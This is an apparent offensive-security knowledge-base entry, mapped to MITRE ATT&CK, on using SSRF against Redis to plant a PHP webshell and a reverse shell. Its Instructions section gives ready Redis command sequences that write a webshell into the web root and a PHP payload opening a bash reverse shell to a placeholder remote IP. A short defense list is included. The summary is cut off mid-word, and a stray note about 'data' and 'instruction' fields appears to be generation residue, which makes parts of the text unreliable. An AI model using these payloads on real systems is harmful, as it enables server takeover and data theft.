---
id: d1fbf2f0-554b-4efd-8ff4-0cdf9d10b760
name: Redis SSRF Exploitation with Webshell and Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.040713+00:00'
updated_at: '2023-04-10T20:24:00.413267+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[Remote File Copy|T1105 - Remote File Copy]]'
- '[[Trusted Relationship|T1199 - Trusted Relationship]]'
tags:
- '[[Server-Side Request Forgery]]'
- '[[SSRF exploiting Redis]]'
---

# Redis SSRF Exploitation with Webshell and Reverse Shell

## Summary

Redis SSRF exploitation with webshell and reverse shell is a technique used by attackers to gain unauthorized access to a system. The attacker sends a specially crafted request to the server, which causes it to send a request to a vulnerable Redis instance. The Redis instance then executes the atta

## Description

# Description

Redis SSRF exploitation with webshell and reverse shell is a technique used by attackers to gain unauthorized access to a system. The attacker sends a specially crafted request to the server, which causes it to send a request to a vulnerable Redis instance. The Redis instance then executes the attacker's command, allowing the attacker to run arbitrary code on the server. This technique can be used to steal sensitive data, install malware, or take control of the server.

From a technical perspective, Redis SSRF exploitation involves sending a specially crafted request to the server that includes a URL pointing to the vulnerable Redis instance. The Redis instance then executes the attacker's command, which can include a webshell or reverse shell. The webshell allows the attacker to execute arbitrary commands on the server, while the reverse shell allows the attacker to establish a persistent connection to the server.

The business value of this attack is that it allows attackers to gain unauthorized access to sensitive data and systems, which can lead to financial loss, reputational damage, and legal liability.

 

## Requirements

1. Access to a vulnerable Redis instance

1. Ability to send a specially crafted request to the server

1. Knowledge of webshell and reverse shell techniques

 

## Defense

1. Implement network segmentation to isolate Redis instances from public-facing web servers

1. Implement access controls to limit access to Redis instances

1. Regularly update Redis to the latest version to patch known vulnerabilities

 

## Objectives

1. Gain unauthorized access to a system

1. Steal sensitive data

1. Install malware

1. Take control of the server

 

# Instructions

1. To get a webshell, execute the following commands:
1. CONFIG SET dir /var/www/html
2. CONFIG SET dbfilename file.php
3. SET mykey "<?php system($_GET[0])?>"
4. SAVE

To get a PHP reverse shell, execute the following commands:
1. _config set dir /var/www/html
2. _config set dbfilename reverse.php
3. _set payload "<?php shell_exec('bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1'); ?>"
4. _save

 



**Code**: [[# Getting a webshell
url=dict://127.0.0.1:6379/CON]]



> The commands in the 'data' field are used to get a webshell and a PHP reverse shell using Redis. The 'instruction' field provides the step-by-step instructions to execute the commands. The 'explain' field is empty as there are no further details to explain.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[Remote File Copy|T1105 - Remote File Copy]]
- [[Trusted Relationship|T1199 - Trusted Relationship]]

## Tags

- [[Server-Side Request Forgery]]
- [[SSRF exploiting Redis]]


